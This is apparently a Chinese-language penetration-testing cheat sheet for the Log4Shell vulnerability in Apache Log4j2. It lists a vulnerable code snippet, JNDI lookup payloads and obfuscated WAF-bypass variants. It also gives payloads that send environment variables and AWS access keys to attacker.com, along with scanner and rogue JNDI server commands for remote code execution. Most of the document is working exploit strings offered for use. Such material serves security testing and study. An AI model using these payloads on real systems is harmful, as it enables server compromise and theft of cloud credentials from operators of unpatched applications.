# CVE-2021-44228 Log4Shell

> Apache Log4j2 <=2.14.1 在配置、日志消息和参数中使用的 JNDI 功能没有保护针对攻击者控制的 LDAP 和其他 JNDI 相关端点。当启用消息查找替换时，能够控制日志消息或日志消息参数的攻击者可以在 LDAP 服务器上加载并执行任意代码。

## 概述

* [漏洞代码](#漏洞代码)
* [有效载荷](#有效载荷)
* [扫描](#扫描)
* [WAF 绕过](#waf绕过)
* [利用](#利用)
    * [环境变量窃取](#环境变量窃取)
    * [远程命令执行](#远程命令执行)
* [参考](#参考)

## 漏洞代码

你可以通过以下方式在本地重现：`docker run --name vulnerable-app -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app` 使用 [christophetd/log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app) 或 [leonjza/log4jpwn](https://github.com/leonjza/log4jpwn)

```java
public String index(@RequestHeader("X-Api-Version") String apiVersion) {
    logger.info("Received a request for API version " + apiVersion);
    return "Hello, world!";
}
```

## 有效载荷

```bash
# 标识 Java 版本和主机名
${jndi:ldap://${java:version}.domain/a}
${jndi:ldap://${env:JAVA_VERSION}.domain/a}
${jndi:ldap://${sys:java.version}.domain/a}
${jndi:ldap://${sys:java.vendor}.domain/a}
${jndi:ldap://${hostName}.domain/a}
${jndi:dns://${hostName}.domain}

# 更多枚举关键字和变量
java:os
docker:containerId
web:rootDir
bundle:config:db.password
```

## 扫描

* [log4j-scan](https://github.com/fullhunt/log4j-scan)

    ```powershell
    usage: log4j-scan.py [-h] [-u URL] [-l USEDLIST] [--request-type REQUEST_TYPE] [--headers-file HEADERS_FILE] [--run-all-tests] [--exclude-user-agent-fuzzing]
                        [--wait-time WAIT_TIME] [--waf-bypass] [--dns-callback-provider DNS_CALLBACK_PROVIDER] [--custom-dns-callback-host CUSTOM_DNS_CALLBACK_HOST]
    python3 log4j-scan.py -u http://127.0.0.1:8081 --run-all-test
    python3 log4j-scan.py -u http://127.0.0.1:808 --waf-bypass
    ```

* [Nuclei 模板](https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/master/cves/2021/CVE-2021-44228.yaml)

## WAF 绕过

```powershell
${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://127.0.0.1:1389/a}

# 使用大小写组合
${${lower:jndi}:${lower:rmi}://127.0.0.1:1389/poc}
${j${loWer:Nd}i${uPper::}://127.0.0.1:1389/poc}
${jndi:${lower:l}${lower:d}a${lower:p}://loc${upper:a}lhost:1389/rce}

# 使用环境变量拼接字母
${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//your.burpcollaborator.net/a}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attacker.com/a}
```

## 利用

### 环境变量窃取

```powershell
${jndi:ldap://${env:USER}.${env:USERNAME}.attacker.com:1389/

# AWS 访问密钥
${jndi:ldap://${env:USER}.${env:USERNAME}.attacker.com:1389/${env:AWS_ACCESS_KEY_ID}/${env:AWS_SECRET_ACCESS_KEY}
```

### 远程命令执行

* [rogue-jndi - @artsploit](https://github.com/artsploit/rogue-jndi)

    ```ps1
    java -jar target/RogueJndi-1.1.jar --command "touch /tmp/toto" --hostname "192.168.1.21"
    Mapping ldap://192.168.1.10:1389/ to artsploit.controllers.RemoteReference
    Mapping ldap://192.168.1.10:1389/o=reference to artsploit.controllers.RemoteReference
    Mapping ldap://192.168.1.10:1389/o=tomcat to artsploit.controllers.Tomcat
    Mapping ldap://192.168.1.10:1389/o=groovy to artsploit.controllers.Groovy
    Mapping ldap://192.168.1.10:1389/o=websphere1 to artsploit.controllers.WebSphere1
    Mapping ldap://192.168.1.10:1389/o=websphere1,wsdl=* to artsploit.controllers.WebSphere1
    Mapping ldap://192.168.1.10:1389/o=websphere2 to artsploit.controllers.WebSphere2
    Mapping ldap://192.168.1.10:1389/o=websphere2,jar=* to artsploit.controllers.WebSphere2
    ```

* [JNDI-Exploit-Kit - @pimps](https://github.com/pimps/JNDI-Exploit-Kit)

## 参考

* [Log4Shell: 日志库 log4j 2 中发现的 RCE 0-day 漏洞 - 2021 年 12 月 12 日](https://www.lunasec.io/docs/blog/log4j-zero-day/)
* [Log4Shell 更新：第二个 log4j 漏洞发布 (CVE-2021-44228 + CVE-2021-45046) - 2021 年 12 月 14 日](https://www.lunasec.io/docs/blog/log4j-zero-day-update-on-cve-2021-45046/)
* [PSA: Log4Shell 和当前的 JNDI 注入状态 - 2021 年 12 月 10 日](https://mbechler.github.io/2021/12/10/PSA_Log4Shell_JNDI_Injection/)